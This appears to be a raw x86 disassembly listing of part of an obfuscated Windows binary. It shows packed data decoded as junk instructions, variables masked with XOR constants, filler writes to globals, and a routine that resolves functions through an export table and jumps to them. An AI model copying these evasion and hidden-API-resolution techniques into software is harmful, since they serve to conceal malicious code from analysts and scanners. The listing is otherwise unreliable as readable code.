  421b09:	mov    al,0xdc
  421b0b:	xor    bh,BYTE PTR [eax+ebx*2]
  421b0e:	mov    ds:0x2e11fe36,al
  421b13:	mov    esp,0xf4b4cfc5
  421b18:	ret    0xfdf0
  421b1b:	ds mov ah,0x4d
  421b1e:	jge    0x421b2c
  421b20:	dec    esi
  421b21:	retf   0xd06f
  421b24:	ins    BYTE PTR es:[edi],dx
  421b25:	mov    esp,0xbf9527d9
  421b2a:	push   ss
  421b2b:	cmp    al,0x72
  421b2d:	dec    eax
  421b2e:	(bad)  
  421b2f:	in     eax,0x47
  421b31:	retf   
  421b32:	pop    ds
  421b33:	xor    eax,0xe412d02c
  421b38:	cld    
  421b39:	pushf  
  421b3a:	ffree  st(1)
  421b3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b3d:	jo     0x421ade
  421b3f:	sbb    ebp,ebp
  421b41:	mov    dh,0x1f
  421b43:	test   al,0x84
  421b45:	pusha  
  421b46:	sar    BYTE PTR [eax],1
  421b48:	xchg   DWORD PTR [edi-0x7617e6c0],eax
  421b4e:	fisttp QWORD PTR [edx+0xe]
  421b51:	mov    ds:0xc28e29d0,al
  421b56:	test   DWORD PTR [edx],esp
  421b58:	(bad)  
  421b5a:	mov    cl,0x5e
  421b5c:	test   DWORD PTR [esi+0x20],esi
  421b5f:	jmp    0x421b94
  421b61:	leave  
  421b62:	cwde   
  421b63:	mov    esp,0x5b866bd4
  421b68:	cmp    al,0x37
  421b6a:	jmp    0x421b23
  421b6c:	sub    eax,0xba396f70
  421b71:	jmp    0x421bb8
  421b73:	ins    DWORD PTR es:[edi],dx
  421b74:	or     al,0xf7
  421b76:	sbb    BYTE PTR [esi+ebp*2],cl
  421b79:	clc    
  421b7a:	stc    
  421b7b:	pop    es
  421b7c:	inc    ecx
  421b7d:	sbb    DWORD PTR ds:0x806a173,eax
  421b83:	sbb    ebx,edx
  421b85:	mov    BYTE PTR [ebx+0x5],dh
  421b88:	(bad)  
  421b89:	mov    esp,0xe856582b
  421b8e:	call   0x5ff2:0xf0f8446b
  421b95:	push   ss
  421b96:	xchg   edx,eax
  421b97:	into   
  421b98:	loope  0x421c10
  421b9a:	xor    esi,0xffffff89
  421b9d:	in     eax,0xb
  421b9f:	pusha  
  421ba0:	mov    cl,0x7e
  421ba2:	popa   
  421ba3:	push   esp
  421ba4:	sbb    dh,BYTE PTR [eax+esi*2+0x2028e636]
  421bab:	mov    DWORD PTR [ebp+0x7],0x79f53243
  421bb2:	push   0x76
  421bb4:	rcl    DWORD PTR [ebp+0x24c5e857],0xb3
  421bbb:	repz call DWORD PTR [ecx+0x3e]
  421bbf:	mov    ah,0xa
  421bc1:	hlt    
  421bc2:	mov    dh,0x19
  421bc4:	inc    ebp
  421bc5:	mov    ch,0x15
  421bc7:	pusha  
  421bc8:	out    0xdf,al
  421bca:	push   es
  421bcb:	add    DWORD PTR [edi-0x4b],0x58
  421bcf:	loope  0x421b7a
  421bd1:	das    
  421bd2:	js     0x421b93
  421bd4:	and    DWORD PTR [eax+ecx*1+0x24],ebx
  421bd8:	lods   al,BYTE PTR ds:[esi]
  421bd9:	add    eax,0x599eb2e6
  421bde:	(bad)  
  421bdf:	push   es
  421be0:	icebp  
  421be1:	inc    edi
  421be2:	add    al,0xc
  421be4:	loop   0x421bbb
  421be6:	dec    edi
  421be7:	(bad)  
  421be8:	mov    al,0x82
  421bea:	jp     0x421bc6
  421bec:	mov    eax,0x6c72cbd7
  421bf1:	je     0x421c2b
  421bf3:	jle    0x421ba8
  421bf5:	xor    al,0x16
  421bf7:	dec    esi
  421bf8:	lea    edx,[ecx-0x53]
  421bfb:	mov    eax,0xc3515cf0
  421c00:	std    
  421c01:	or     eax,0xa299e094
  421c06:	push   es
  421c07:	cmp    edx,DWORD PTR [edi+0x46]
  421c0a:	data16 fistp QWORD PTR ds:0xf911e97f
  421c11:	jnp    0x421c5d
  421c13:	dec    edi
  421c14:	xlat   BYTE PTR ds:[ebx]
  421c15:	sbb    cl,BYTE PTR [ebx+0x3f]
  421c18:	add    bh,BYTE PTR [edx-0x502c8553]
  421c1e:	jno    0x421bbe
  421c20:	cmp    BYTE PTR [esi+0x2df7e3b5],bl
  421c26:	lea    esi,[esi+ecx*2]
  421c29:	or     cl,dl
  421c2b:	test   bl,bh
  421c2d:	mov    ebx,0xfe891c31
  421c32:	outs   dx,BYTE PTR ds:[esi]
  421c33:	pop    esp
  421c34:	sahf   
  421c35:	ins    DWORD PTR es:[edi],dx
  421c36:	jae    0x421bc0
  421c38:	cld    
  421c39:	mov    bl,BYTE PTR [edi+0xddbeba7]
  421c3f:	daa    
  421c40:	push   cs
  421c41:	mov    DWORD PTR [ecx],ebx
  421c43:	retf   0xb38f
  421c46:	xor    DWORD PTR [ecx-0x1c],edi
  421c49:	cmp    BYTE PTR [esi],al
  421c4b:	sbb    eax,0x93f3eba3
  421c50:	fcom   DWORD PTR [eax+0x5aeea484]
  421c56:	clc    
  421c57:	out    0x88,al
  421c59:	pop    ss
  421c5a:	imul   ebx,DWORD PTR [edx],0x53
  421c5d:	(bad)  
  421c5e:	pop    edi
  421c5f:	push   ebx
  421c60:	ret    
  421c61:	inc    edi
  421c62:	push   ebx
  421c63:	add    eax,0xe4af814e
  421c68:	inc    eax
  421c69:	and    BYTE PTR [ebp+edi*2+0x7db9b4f2],ah
  421c70:	push   esi
  421c71:	and    DWORD PTR [ebp-0x4f],ecx
  421c74:	pop    es
  421c75:	sbb    al,0x29
  421c77:	cwde   
  421c78:	or     edx,DWORD PTR [eax-0x50]
  421c7b:	retf   0xf66
  421c7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c7f:	ror    DWORD PTR [edi-0x1c9cf7e],cl
  421c85:	mov    ecx,0xe26156b9
  421c8a:	ds mov ebp,0x716d5f3
  421c90:	ins    BYTE PTR es:[edi],dx
  421c91:	test   BYTE PTR [edx+0x150babf],al
  421c97:	sbb    cl,BYTE PTR [eax]
  421c99:	or     al,0x9c
  421c9b:	inc    edx
  421c9c:	je     0x421c83
  421c9e:	out    dx,eax
  421c9f:	mov    eax,0xb29924f
  421ca4:	add    esi,DWORD PTR [ebp-0x1f8]
  421caa:	mov    DWORD PTR [ebp-0x1f8],esi
  421cb0:	mov    eax,DWORD PTR [ebp-0x1e8]
  421cb6:	cmp    DWORD PTR [ebp-0x1f8],eax
  421cbc:	je     0x421e26
  421cc2:	mov    eax,DWORD PTR [ebp-0x1f8]
  421cc8:	mov    ecx,DWORD PTR [ebp-0x20c]
  421cce:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  421cd3:	xor    eax,0xa59b
  421cd8:	movzx  eax,ax
  421cdb:	sar    eax,1
  421cdd:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421ce3:	mov    edx,DWORD PTR [ebp-0x20c]
  421ce9:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  421cee:	xor    ecx,0xa59b
  421cf4:	movzx  ecx,cx
  421cf7:	shl    ecx,0xf
  421cfa:	or     eax,ecx
  421cfc:	movzx  eax,ax
  421cff:	mov    DWORD PTR [ebp-0x1fc],eax
  421d05:	jmp    0x421ddc
  421d0a:	jg     0x421cee
  421d0c:	sbb    BYTE PTR [edx-0x144c4344],ch
  421d12:	outs   dx,BYTE PTR ds:[esi]
  421d13:	mov    esp,0x4f4990cd
  421d18:	mov    al,0xcf
  421d1a:	cmp    cl,cl
  421d1c:	sar    BYTE PTR [esi-0x414141d6],0x26
  421d23:	xor    al,BYTE PTR [ecx+eax*8-0x2d42c482]
  421d2a:	xlat   BYTE PTR ds:[ebx]
  421d2b:	mov    ds:0xa43ec78b,al
  421d30:	xchg   DWORD PTR [ebp+0x5b],edi
  421d33:	int    0x8e
  421d35:	and    DWORD PTR [ebx+0x72],ebx
  421d38:	mov    eax,ds:0x27b05b50
  421d3d:	ins    BYTE PTR es:[edi],dx
  421d3e:	jns    0x421d55
  421d40:	mov    ds:0x6adbfb4f,al
  421d45:	(bad)  
  421d46:	xlat   BYTE PTR ds:[ebx]
  421d47:	mov    ds:0x56b21560,al
  421d4c:	fcomp  DWORD PTR [eax]
  421d4e:	pop    ebp
  421d4f:	cli    
  421d50:	mov    edi,0x544a11d7
  421d55:	dec    ebp
  421d56:	psraw  mm4,mm6
  421d59:	sub    bh,BYTE PTR [edi]
  421d5b:	jne    0x421d69
  421d5d:	mov    WORD PTR [ebx+0x706cb2e7],es
  421d63:	push   0xffffffa6
  421d65:	jl     0x421d91
  421d67:	inc    esi
  421d68:	xlat   BYTE PTR ds:[ebx]
  421d69:	sub    eax,0xff2f22d1
  421d6e:	xchg   ecx,eax
  421d6f:	cmp    BYTE PTR [ebp-0x29],ah
  421d72:	mov    al,ds:0x3051844f
  421d77:	rcl    DWORD PTR [ecx-0x4f],1
  421d7a:	push   eax
  421d7b:	cld    
  421d7c:	or     eax,0xd9482e56
  421d81:	fbstp  TBYTE PTR ds:[esp+esi*2-0x65]
  421d86:	push   0x858ad546
  421d8b:	(bad)  
  421d8d:	lds    edx,FWORD PTR ds:0x898f6e1f
  421d93:	shl    BYTE PTR [eax+0x42de6bd0],0x76
  421d9a:	aas    
  421d9b:	retf   0x3e98
  421d9e:	push   0xd66c5f63
  421da3:	sub    dl,BYTE PTR [ebx]
  421da5:	mov    ecx,0x489256b9
  421daa:	jge    0x421d70
  421dac:	cdq    
  421dad:	ss mov esp,0xb4f2f7e0
  421db3:	mov    dh,0x3d
  421db5:	jp     0x421da4
  421db7:	pop    eax
  421db8:	or     eax,0x638034a7
  421dbd:	inc    eax
  421dbe:	sysenter 
  421dc0:	inc    edi
  421dc1:	aad    0xb
  421dc3:	int3   
  421dc4:	imul   ah
  421dc6:	xchg   ebx,eax
  421dc7:	gs xor ch,ch
  421dca:	addr16 inc ebp
  421dcc:	(bad)  
  421dce:	push   cs
  421dcf:	sbb    ch,cl
  421dd1:	mov    WORD PTR [ebx+ebx*4-0x51854007],cs
  421dd8:	inc    esp
  421dd9:	mov    ebx,0x858b548d
  421dde:	or     dh,bh
  421de0:	(bad)  
  421de1:	dec    DWORD PTR [ebx-0x20b73]
  421de7:	dec    DWORD PTR [edi]
  421de9:	mov    bh,0x4
  421deb:	xor    DWORD PTR ds:0xa59b,0xd1c0b70f
  421df5:	clc    
  421df6:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421dfc:	mov    edx,DWORD PTR [ebp-0x20c]
  421e02:	movzx  ecx,WORD PTR [edx+ecx*4]
  421e06:	xor    ecx,0xa59b
  421e0c:	movzx  ecx,cx
  421e0f:	shl    ecx,0xf
  421e12:	or     eax,ecx
  421e14:	mov    ecx,DWORD PTR [ebp-0x1fc]
  421e1a:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  421e21:	jmp    0x421879
  421e26:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e2c:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e32:	xor    eax,0xcb79b576
  421e37:	xor    edx,0x9c2b8ae8
  421e3d:	mov    cl,0x2
  421e3f:	call   0x408bb8
  421e44:	mov    esi,eax
  421e46:	mov    edi,edx
  421e48:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e4e:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e54:	xor    eax,0xcb79b576
  421e59:	xor    edx,0x9c2b8ae8
  421e5f:	mov    cl,0x3e
  421e61:	call   0x4223f5
  421e66:	or     esi,eax
  421e68:	or     edi,edx
  421e6a:	mov    DWORD PTR [ebp-0x1e4],esi
  421e70:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e76:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e7c:	xor    eax,0xcb79b576
  421e81:	xor    edx,0x9c2b8ae8
  421e87:	mov    cl,0x2
  421e89:	call   0x408bb8
  421e8e:	mov    esi,eax
  421e90:	mov    edi,edx
  421e92:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e98:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e9e:	xor    eax,0xcb79b576
  421ea3:	xor    edx,0x9c2b8ae8
  421ea9:	mov    cl,0x3e
  421eab:	call   0x4223f5
  421eb0:	or     esi,eax
  421eb2:	or     edi,edx
  421eb4:	mov    DWORD PTR [ebp-0x23c],esi
  421eba:	mov    DWORD PTR [ebp-0x238],edi
  421ec0:	mov    eax,DWORD PTR [ebp-0x23c]
  421ec6:	or     eax,DWORD PTR [ebp-0x238]
  421ecc:	je     0x42212c
  421ed2:	lea    eax,[ebp-0x204]
  421ed8:	mov    DWORD PTR [ebp-0x208],eax
  421ede:	mov    eax,DWORD PTR [ebp-0x1e4]
  421ee4:	xor    edx,edx
  421ee6:	mov    cl,0x2
  421ee8:	call   0x4223f5
  421eed:	mov    esi,eax
  421eef:	mov    edi,edx
  421ef1:	mov    eax,DWORD PTR [ebp-0x1e4]
  421ef7:	xor    edx,edx
  421ef9:	mov    cl,0x3e
  421efb:	call   0x408bb8
  421f00:	or     esi,eax
  421f02:	or     edi,edx
  421f04:	xor    esi,0xcb79b576
  421f0a:	xor    edi,0x9c2b8ae8
  421f10:	mov    eax,DWORD PTR [ebp-0x208]
  421f16:	mov    DWORD PTR [eax],esi
  421f18:	mov    DWORD PTR [eax+0x4],edi
  421f1b:	mov    eax,DWORD PTR [ebp-0x1e4]
  421f21:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421f29:	mov    eax,DWORD PTR [ebp-0x1e0]
  421f2f:	mov    edx,DWORD PTR [ebp-0x1dc]
  421f35:	xor    eax,0xcb79b576
  421f3a:	xor    edx,0x9c2b8ae8
  421f40:	mov    cl,0x2
  421f42:	call   0x408bb8
  421f47:	mov    ebx,eax
  421f49:	mov    edi,edx
  421f4b:	mov    eax,DWORD PTR [ebp-0x1e0]
  421f51:	mov    edx,DWORD PTR [ebp-0x1dc]
  421f57:	xor    eax,0xcb79b576
  421f5c:	xor    edx,0x9c2b8ae8
  421f62:	mov    cl,0x3e
  421f64:	call   0x4223f5
  421f69:	or     ebx,eax
  421f6b:	or     edi,edx
  421f6d:	movsx  eax,bl
  421f70:	cmp    esi,eax
  421f72:	je     0x4220d2
  421f78:	mov    eax,DWORD PTR [ebp-0x1e4]
  421f7e:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421f86:	mov    eax,DWORD PTR [ebp-0x204]
  421f8c:	mov    edx,DWORD PTR [ebp-0x200]
  421f92:	xor    eax,0xcb79b576
  421f97:	xor    edx,0x9c2b8ae8
  421f9d:	mov    cl,0x2
  421f9f:	call   0x408bb8
  421fa4:	mov    edi,eax
  421fa6:	mov    ebx,edx
  421fa8:	mov    eax,DWORD PTR [ebp-0x204]
  421fae:	mov    edx,DWORD PTR [ebp-0x200]
  421fb4:	xor    eax,0xcb79b576
  421fb9:	xor    edx,0x9c2b8ae8
  421fbf:	mov    cl,0x3e
  421fc1:	call   0x4223f5
  421fc6:	or     edi,eax
  421fc8:	or     ebx,edx
  421fca:	mov    eax,DWORD PTR [ebp-0x210]
  421fd0:	movsx  eax,BYTE PTR [eax+edi*1]
  421fd4:	cmp    esi,eax
  421fd6:	je     0x421fe6
  421fdc:	jmp    0x42212c
  421fe1:	jmp    0x4220d2
  421fe6:	mov    eax,DWORD PTR [ebp-0x204]
  421fec:	mov    edx,DWORD PTR [ebp-0x200]
  421ff2:	xor    eax,0xcb79b576
  421ff7:	xor    edx,0x9c2b8ae8
  421ffd:	mov    cl,0x2
  421fff:	call   0x408bb8
  422004:	mov    esi,eax
  422006:	mov    edi,edx
  422008:	mov    eax,DWORD PTR [ebp-0x204]
  42200e:	mov    edx,DWORD PTR [ebp-0x200]
  422014:	xor    eax,0xcb79b576
  422019:	xor    edx,0x9c2b8ae8
  42201f:	mov    cl,0x3e
  422021:	call   0x4223f5
  422026:	or     esi,eax
  422028:	or     edi,edx
  42202a:	mov    eax,DWORD PTR [ebp-0x210]
  422030:	movsx  esi,BYTE PTR [eax+esi*1]
  422034:	mov    eax,DWORD PTR [ebp-0x1f0]
  42203a:	mov    edx,DWORD PTR [ebp-0x1ec]
  422040:	xor    eax,0xcb79b576
  422045:	xor    edx,0x9c2b8ae8
  42204b:	mov    cl,0x2
  42204d:	call   0x408bb8
  422052:	mov    ebx,eax
  422054:	mov    edi,edx
  422056:	mov    eax,DWORD PTR [ebp-0x1f0]
  42205c:	mov    edx,DWORD PTR [ebp-0x1ec]
  422062:	xor    eax,0xcb79b576
  422067:	xor    edx,0x9c2b8ae8
  42206d:	mov    cl,0x3e
  42206f:	call   0x4223f5
  422074:	or     ebx,eax
  422076:	or     edi,edx
  422078:	movsx  eax,bl
  42207b:	cmp    esi,eax
  42207d:	jne    0x4220d2
  422083:	mov    eax,DWORD PTR [ebp-0x1e0]
  422089:	mov    edx,DWORD PTR [ebp-0x1dc]
  42208f:	xor    eax,0xcb79b576
  422094:	xor    edx,0x9c2b8ae8
  42209a:	mov    cl,0x2
  42209c:	call   0x408bb8
  4220a1:	mov    esi,eax
  4220a3:	mov    edi,edx
  4220a5:	mov    eax,DWORD PTR [ebp-0x1e0]
  4220ab:	mov    edx,DWORD PTR [ebp-0x1dc]
  4220b1:	xor    eax,0xcb79b576
  4220b6:	xor    edx,0x9c2b8ae8
  4220bc:	mov    cl,0x3e
  4220be:	call   0x4223f5
  4220c3:	or     esi,eax
  4220c5:	or     edi,edx
  4220c7:	mov    DWORD PTR [ebp-0x214],esi
  4220cd:	jmp    0x422176
  4220d2:	mov    eax,DWORD PTR [ebp-0x1e0]
  4220d8:	mov    edx,DWORD PTR [ebp-0x1dc]
  4220de:	xor    eax,0xcb79b576
  4220e3:	xor    edx,0x9c2b8ae8
  4220e9:	mov    cl,0x2
  4220eb:	call   0x408bb8
  4220f0:	mov    esi,eax
  4220f2:	mov    edi,edx
  4220f4:	mov    eax,DWORD PTR [ebp-0x1e0]
  4220fa:	mov    edx,DWORD PTR [ebp-0x1dc]
  422100:	xor    eax,0xcb79b576
  422105:	xor    edx,0x9c2b8ae8
  42210b:	mov    cl,0x3e
  42210d:	call   0x4223f5
  422112:	or     esi,eax
  422114:	or     edi,edx
  422116:	add    esi,DWORD PTR [ebp-0x1e4]
  42211c:	mov    DWORD PTR [ebp-0x1e4],esi
  422122:	jmp    0x421e70
  422127:	jmp    0x421e70
  42212c:	mov    eax,DWORD PTR [ebp-0x1f0]
  422132:	mov    edx,DWORD PTR [ebp-0x1ec]
  422138:	xor    eax,0xcb79b576
  42213d:	xor    edx,0x9c2b8ae8
  422143:	mov    cl,0x2
  422145:	call   0x408bb8
  42214a:	mov    esi,eax
  42214c:	mov    edi,edx
  42214e:	mov    eax,DWORD PTR [ebp-0x1f0]
  422154:	mov    edx,DWORD PTR [ebp-0x1ec]
  42215a:	xor    eax,0xcb79b576
  42215f:	xor    edx,0x9c2b8ae8
  422165:	mov    cl,0x3e
  422167:	call   0x4223f5
  42216c:	or     esi,eax
  42216e:	or     edi,edx
  422170:	mov    DWORD PTR [ebp-0x214],esi
  422176:	mov    eax,DWORD PTR [ebp-0x214]
  42217c:	mov    DWORD PTR [ebp-0xc8],eax
  422182:	cmp    DWORD PTR [ebp-0xc8],0x0
  422189:	je     0x4221b3
  42218f:	mov    eax,DWORD PTR [ebp-0x144]
  422195:	mov    ecx,DWORD PTR [ebp-0xac]
  42219b:	movzx  eax,WORD PTR [ecx+eax*2]
  42219f:	mov    ecx,DWORD PTR [ebp-0xa8]
  4221a5:	mov    eax,DWORD PTR [ecx+eax*4]
  4221a8:	mov    DWORD PTR [ebp-0xfc],eax
  4221ae:	jmp    0x4221b8
  4221b3:	jmp    0x420789
  4221b8:	cmp    DWORD PTR [ebp-0xfc],0x0
  4221bf:	jne    0x4221cc
  4221c5:	xor    eax,eax
  4221c7:	jmp    0x4223ee
  4221cc:	mov    eax,DWORD PTR [ebp+0x8]
  4221cf:	add    eax,DWORD PTR [ebp-0xfc]
  4221d5:	mov    DWORD PTR [ebp-0xec],eax
  4221db:	mov    DWORD PTR [ebp-0x74],0x0
  4221e2:	cmp    DWORD PTR [ebp-0xb0],0x0
  4221e9:	je     0x422265
  4221ef:	cmp    DWORD PTR [ebp-0xb0],0x0
  4221f6:	je     0x422265
  4221fc:	mov    eax,DWORD PTR [ebp-0xb0]
  422202:	shl    eax,0x2
  422205:	mov    DWORD PTR [ebp-0x74],eax
  422208:	mov    DWORD PTR [ebp-0x14c],0x0
  422212:	sub    esp,DWORD PTR [ebp-0x74]
  422215:	mov    DWORD PTR [ebp-0x14c],esp
  42221b:	mov    DWORD PTR [ebp-0x148],0x0
  422225:	mov    eax,DWORD PTR [ebp-0x148]
  42222b:	cmp    eax,DWORD PTR [ebp-0xb0]
  422231:	je     0x422265
  422237:	mov    eax,DWORD PTR [ebp-0x148]
  42223d:	mov    ecx,DWORD PTR [ebp-0x14c]
  422243:	mov    edx,DWORD PTR [ebp-0x148]
  422249:	mov    esi,DWORD PTR [ebp+0x14]
  42224c:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  422250:	mov    DWORD PTR [ecx+eax*4],edx
  422253:	mov    eax,DWORD PTR [ebp-0x148]
  422259:	inc    eax
  42225a:	mov    DWORD PTR [ebp-0x148],eax
  422260:	jmp    0x422225
  422265:	mov    DWORD PTR [ebp-0x9c],0x0
  42226f:	push   0x4223a7
  422274:	jmp    DWORD PTR [ebp-0xec]
  42227a:	mov    eax,eax
  42227c:	mov    ecx,esp
  42227e:	ret    0x8
  422281:	cmp    DWORD PTR ds:0x428405,0x0
  422288:	not    DWORD PTR ds:0x428405
  42228e:	mov    DWORD PTR ds:0x42841d,0x5307
  422298:	mov    DWORD PTR ds:0x428575,0x4819
  4222a2:	jmp    0x4222e4
  4222a7:	not    eax
  4222a9:	cmp    DWORD PTR ds:0x428405,0x0
  4222b0:	jl     0x4222d2
  4222b6:	push   0x0
  4222b8:	call   DWORD PTR ds:0x42e13c
  4222be:	add    DWORD PTR ds:0x4284f5,0x4c21
  4222c8:	and    DWORD PTR ds:0x4284dd,0x73e0
  4222d2:	sub    DWORD PTR ds:0x428449,edx
  4222d8:	or     DWORD PTR ds:0x428351,ecx
  4222de:	sub    DWORD PTR ds:0x4284ed,ebx
  4222e4:	push   ebx
  4222e5:	dec    eax
  4222e6:	push   esi
  4222e7:	mov    eax,DWORD PTR [esp+0x18]
  4222eb:	or     eax,eax
  4222ed:	mov    DWORD PTR ds:0x42840d,0x72ef
  4222f7:	jne    0x422333
  4222fd:	mov    ecx,DWORD PTR [esp+0x14]
  422301:	mov    eax,DWORD PTR [esp+0x10]
  422305:	xor    edx,edx
  422307:	inc    ebx
  422308:	div    ecx
  42230a:	sbb    ebx,DWORD PTR ds:0x428559
  422310:	mov    ebx,eax
  422312:	mov    eax,DWORD PTR [esp+0xc]
  422316:	adc    DWORD PTR ds:0x4284dd,0x42846d
  422320:	div    ecx
  422322:	mov    DWORD PTR ds:0x428405,0x3a7e
  42232c:	mov    edx,ebx
  42232e:	jmp    0x4223a2
  422333:	mov    ecx,eax
  422335:	mov    ebx,DWORD PTR [esp+0x14]
  422339:	xor    eax,DWORD PTR ds:0x428579
  42233f:	mov    edx,DWORD PTR [esp+0x10]
  422343:	mov    eax,DWORD PTR [esp+0xc]
  422347:	mov    DWORD PTR ds:0x428475,0x7dde
  422351:	shr    ecx,1
  422353:	mov    DWORD PTR ds:0x428565,0x121c
  42235d:	rcr    ebx,1
  42235f:	shr    edx,1
  422361:	rcr    eax,1
  422363:	or     ecx,ecx
  422365:	jne    0x422347
  42236b:	div    ebx
  42236d:	mov    esi,eax
  42236f:	mul    DWORD PTR [esp+0x18]
  422373:	mov    ecx,eax
  422375:	mov    eax,DWORD PTR [esp+0x14]
  422379:	mul    esi
  42237b:	add    edx,ecx
  42237d:	jb     0x42239d
  422383:	cmp    edx,DWORD PTR [esp+0x10]
  422387:	ja     0x42239d
  42238d:	jb     0x42239e
  422393:	cmp    eax,DWORD PTR [esp+0xc]
  422397:	jbe    0x42239e
  42239d:	dec    esi
  42239e:	xor    edx,edx
  4223a0:	mov    eax,esi
  4223a2:	pop    esi
  4223a3:	pop    ebx
  4223a4:	ret    0x10
  4223a7:	sub    DWORD PTR [ebp+0x10],0x1
  4223ab:	mov    DWORD PTR ds:0x4284e1,0x3767
  4223b5:	cmp    DWORD PTR [ebp+0x10],0x0
  4223b9:	mov    DWORD PTR ds:0x428569,0xcef
  4223c3:	je     0x4223d8
  4223c9:	mov    esi,DWORD PTR ds:0x4284f9
  4223cf:	sbb    DWORD PTR ds:0x428565,esi
  4223d5:	add    esp,DWORD PTR [ebp-0x74]
  4223d8:	mov    DWORD PTR [ebp-0x9c],eax
  4223de:	mov    eax,DWORD PTR [ebp-0x9c]
  4223e4:	mov    DWORD PTR ds:0x428431,0x5e8f
  4223ee:	pop    edi
  4223ef:	pop    esi
  4223f0:	pop    ebx
  4223f1:	leave  
  4223f2:	ret    0x10
  4223f5:	cmp    cl,0x40
  4223f8:	mov    DWORD PTR ds:0x428435,0x7c93
  422402:	jae    0x422442
  422408:	cmp    cl,0x20
  42240b:	mov    DWORD PTR ds:0x428371,0x440e
  422415:	jae    0x422421
  42241b:	shld   edx,eax,cl
  42241e:	shl    eax,cl
  422420:	ret    
  422421:	movzx  edx,WORD PTR ds:0x4284c5
  422428:	add    DWORD PTR ds:0x428475,edx
  42242e:	mov    edx,eax
  422430:	xor    eax,eax
  422432:	mov    DWORD PTR ds:0x428361,0x5f4f
  42243c:	and    cl,0x1f
  42243f:	shl    edx,cl
  422441:	ret    
  422442:	xor    eax,eax
  422444:	xor    edx,edx
  422446:	ret    
	...
  42244f:	add    BYTE PTR [ebx+esi*2],al
  422452:	xchg   ecx,ebp
  422454:	push   ebx
  422455:	into   
  422456:	jns    0x4224b9
  422458:	push   0x98626f72
  42245d:	xor    eax,0x74b9d761
  422462:	jne    0x4224d2
  422464:	and    dl,bl
  422466:	mov    ch,0xed
  422468:	popf   
  422469:	bnd ret 0xa4
  42246d:	add    BYTE PTR [eax],al
  42246f:	add    BYTE PTR [edi+0x72],ah
  422472:	gs popa 
  422474:	je     0x4224dd
  422476:	jb     0x4224dd
  422478:	popa   
  422479:	je     0x4224e2
  42247b:	jb     0x4224e2
  42247d:	popa   
  42247e:	je     0x4224e7
  422480:	jb     0x4224e7
  422482:	popa   
  422483:	je     0x4224ec
  422485:	jb     0x4224ec
  422487:	popa   
  422488:	je     0x4224f1
  42248a:	jb     0x4224f1
  42248c:	popa   
  42248d:	je     0x4224f6
  42248f:	jb     0x4224f6
  422491:	popa   
  422492:	je     0x4224fb
  422494:	jb     0x4224fb
  422496:	popa   
  422497:	je     0x422500
  422499:	jb     0x422500
  42249b:	popa   
  42249c:	je     0x422505
  42249e:	jb     0x422505
  4224a0:	popa   
  4224a1:	je     0x4224a3
  4224a3:	add    BYTE PTR [eax+0x65],ch
  4224a6:	ins    BYTE PTR es:[edi],dx
  4224a7:	ins    BYTE PTR es:[edi],dx
  4224a8:	push   0x686c6c65
  4224ad:	gs ins BYTE PTR es:[edi],dx
  4224af:	ins    BYTE PTR es:[edi],dx
  4224b0:	push   0x686c6c65
  4224b5:	gs ins BYTE PTR es:[edi],dx
  4224b7:	ins    BYTE PTR es:[edi],dx
  4224b8:	push   0x686c6c65
  4224bd:	gs ins BYTE PTR es:[edi],dx
  4224bf:	ins    BYTE PTR es:[edi],dx
  4224c0:	push   0x686c6c65
  4224c5:	gs ins BYTE PTR es:[edi],dx
  4224c7:	ins    BYTE PTR es:[edi],dx
  4224c8:	push   0x686c6c65
  4224cd:	gs ins BYTE PTR es:[edi],dx
  4224cf:	ins    BYTE PTR es:[edi],dx
  4224d0:	push   0x686c6c65
  4224d5:	gs ins BYTE PTR es:[edi],dx
  4224d7:	ins    BYTE PTR es:[edi],dx
  4224d8:	add    BYTE PTR [eax],al
  4224da:	add    BYTE PTR [eax],al
  4224dc:	outs   dx,DWORD PTR ds:[esi]
  4224dd:	add    BYTE PTR [eax+eax*1+0x65],ch
  4224e1:	add    BYTE PTR [ecx+0x0],ah
  4224e4:	jne    0x4224e6
  4224e6:	je     0x4224e8
  4224e8:	xor    eax,DWORD PTR [eax]
  4224ea:	xor    al,BYTE PTR [eax]
  4224ec:	add    BYTE PTR [eax],al
  4224ee:	add    BYTE PTR [eax],al
  4224f0:	push   0x61006500
  4224f5:	add    BYTE PTR [esi+0x0],dh
  4224f8:	add    BYTE PTR gs:[esi+0x0],ch
  4224fc:	push   0x61006500
  422501:	add    BYTE PTR [esi+0x0],dh
  422504:	add    BYTE PTR gs:[esi+0x0],ch
  422508:	push   0x61006500
  42250d:	add    BYTE PTR [esi+0x0],dh
  422510:	add    BYTE PTR gs:[esi+0x0],ch
  422514:	push   0x61006500
  422519:	add    BYTE PTR [esi+0x0],dh
  42251c:	add    BYTE PTR gs:[esi+0x0],ch
  422520:	push   0x61006500
  422525:	add    BYTE PTR [esi+0x0],dh
  422528:	add    BYTE PTR gs:[esi+0x0],ch
  42252c:	push   0x61006500
  422531:	add    BYTE PTR [esi+0x0],dh
  422534:	add    BYTE PTR gs:[esi+0x0],ch
  422538:	push   0x61006500
  42253d:	add    BYTE PTR [esi+0x0],dh
  422540:	add    BYTE PTR gs:[esi+0x0],ch
  422544:	push   0x61006500
  422549:	add    BYTE PTR [esi+0x0],dh
  42254c:	add    BYTE PTR gs:[esi+0x0],ch
  422550:	push   0x61006500
  422555:	add    BYTE PTR [esi+0x0],dh
  422558:	add    BYTE PTR gs:[esi+0x0],ch
  42255c:	add    BYTE PTR [eax],al
  42255e:	add    BYTE PTR [eax],al
  422560:	fsub   QWORD PTR [edx+eax*2]
  422563:	add    BYTE PTR [edi+0x6c],cl
  422566:	gs dec ecx
  422568:	arpl   WORD PTR [edi+0x6e],bp
